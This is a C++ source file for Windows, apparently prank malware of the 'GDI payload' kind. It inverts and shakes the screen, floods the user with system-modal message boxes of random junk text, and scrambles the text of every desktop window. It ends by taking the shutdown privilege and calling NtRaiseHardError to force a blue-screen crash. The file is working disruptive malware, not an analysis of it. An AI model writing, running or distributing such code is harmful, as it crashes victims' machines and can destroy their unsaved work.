#include "Include.h"


extern "C"
NTSTATUS NTAPI
RtlAdjustPrivilege(
	ULONG Privilege,
	BOOLEAN Enable,
	BOOLEAN CurrThread,
	PBOOLEAN StatusPointer);

extern "C"
NTSTATUS NTAPI
NtRaiseHardError(
	NTSTATUS ErrorStatus,
	ULONG NumberOfParameters,
	ULONG UnicodeStringParameterMask,
	PULONG_PTR Parameters,
	ULONG ValidResponseOption,
	PULONG Response);

void rainb(std::atomic<bool>& quit_flag) {
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	while(!quit_flag) {
		COLORREF ColorRush = RGB(rand() % 255, rand() % 255, rand() % 255);
		HBRUSH hBrush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(desk, hBrush);
		PatBlt(desk, 0, 0, sw, sh, PATINVERT);
		Sleep(100);
	}
}

std::string gen_random() {
	static const char x[] =
		"kids! racism! bored lol zzzdsahdygijoufhgfjoi";
	int len = 30;
	std::string STR;
	STR.reserve(len);
	for (int i = 0; i < len; ++i) {
		STR += x[rand() % (sizeof(x) - 1)];
	}
	return STR;
}

LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);


int x = rand() % (500 );
int y = rand() % (700) ;

LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HCBT_CREATEWND) {
		CREATESTRUCT* pcs = ((CBT_CREATEWND*)lParam)->lpcs;

		if ((pcs->style & WS_DLGFRAME) || (pcs->style & WS_POPUP)) {
			HWND hwnd = (HWND)wParam;

			pcs->x = x;
			pcs->y = y;
		}


	}

	return CallNextHookEx(0, nCode, wParam, lParam);
}

DWORD WINAPI ripMessageThread(LPVOID parameter) {
	HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
	std::string lol = gen_random();
	std::string lol2 = gen_random();
	MessageBoxA(NULL, (LPCSTR)lol.c_str(), "fortnite borgor", MB_OK | MB_SYSTEMMODAL | MB_ICONHAND);
	UnhookWindowsHookEx(hook);
	return 0;
}


void strReverseW(LPWSTR str) {
	int len = lstrlenW(str);
	if (len <= 1)
		return;
	WCHAR c;
	int i, j;
	for (i = 0, j = len - 1; i < j; i++, j--) {
		c = str[i+(rand() % 10)];
		str[i] = str[rand () % j];
		str[rand () % j] = c;
	}
}


BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
	LPWSTR str = (LPWSTR)GlobalAlloc(GMEM_ZEROINIT, sizeof(WCHAR) * 8192);
	if (SendMessageTimeoutW(hwnd, WM_GETTEXT, 8192, (LPARAM)str, SMTO_ABORTIFHUNG, 100, NULL)) {
		strReverseW(str);
		SendMessageTimeoutW(hwnd, WM_SETTEXT, NULL, (LPARAM)str, SMTO_ABORTIFHUNG, 100, NULL);
	}
	GlobalFree(str);
	return TRUE;
}


int payloadChangeText() {
		EnumChildWindows(GetDesktopWindow(), &EnumChildProc, NULL);
		return 1;
}

int scrshake(std::atomic<bool>& quit_flag) {
	while (!quit_flag) {
		HDC _h = GetDC(0);
		int x = SM_CXSCREEN;
		int y = SM_CYSCREEN;
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		BitBlt(_h, rand() % 5, rand() % 5, w, h, _h, rand() % 5, rand() % 5, SRCCOPY);
		Sleep(10);
	}
	return 1;
}



int main(void) {
	Sleep(100);
	GTDesktop();
	Sleep(10);
	std::atomic_bool quit_flag(false);
	std::atomic_bool delayed_quit_flag(false);
	std::atomic_bool ddelayed_quit_flag(false);
	srand((unsigned int)time(NULL));
	thread a(ScrMove, std::ref(quit_flag));
	thread b(rainb, std::ref(delayed_quit_flag));
	thread c(scrshake, std::ref(ddelayed_quit_flag));
	Sleep(10000);
	quit_flag = true;
	for (int i = 0; i < 20; i++) {
		CreateThread(NULL, 4096, &ripMessageThread, NULL, NULL, NULL);
		Sleep(500);
		 x = rand() % (1920);
		 y = rand() % (1080);
		payloadChangeText();
	}
	delayed_quit_flag = true;
	Sleep(10000);
	ddelayed_quit_flag = true;

	BOOLEAN bl;
	unsigned long response;
	RtlAdjustPrivilege(19, true, false, &bl);
	NtRaiseHardError(STATUS_ASSERTION_FAILURE,
		0, 0, 0, 6, &response);

	ExitProcess(1);
	while (true)
		if (GetKeyState(VK_SHIFT) & 0x8000)
			ExitProcess(1);
	
	return 1;
}
